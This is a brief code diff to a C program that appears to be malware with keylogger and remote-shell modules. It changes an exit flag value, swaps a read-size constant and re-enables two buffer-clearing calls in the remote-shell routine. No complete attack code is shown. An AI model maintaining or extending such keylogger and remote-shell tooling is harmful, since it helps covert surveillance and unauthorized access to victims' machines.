@@ -442,7 +442,7 @@ void dispatch_modules(char *argv[])
             }
         }
 
-        if(flag == 21)
+        if(flag == 22)
         {
             printf("\t\t - EXITING KEYLOGGER - \n");
 
@@ -1285,7 +1285,7 @@ void *start_remote_shell(char *argv[])
             pthread_exit(NULL);
         }
 
-        ret = fread(buffer_cmd, MAXDATASIZE, sizeof(char), pipe[1]);
+        ret = fread(buffer_cmd, BUFSIZ, sizeof(char), pipe[1]);
         if(ret < 0)
         {
 
@@ -1299,8 +1299,8 @@ void *start_remote_shell(char *argv[])
             pthread_exit(NULL);
         }
 
-        //clean_buffer(buffer_cmd);
-        //clean_buffer(buffer);
+        clean_buffer(buffer_cmd);
+        clean_buffer(buffer);
 
         if(pclose(pipe[0]) == -1)
         {
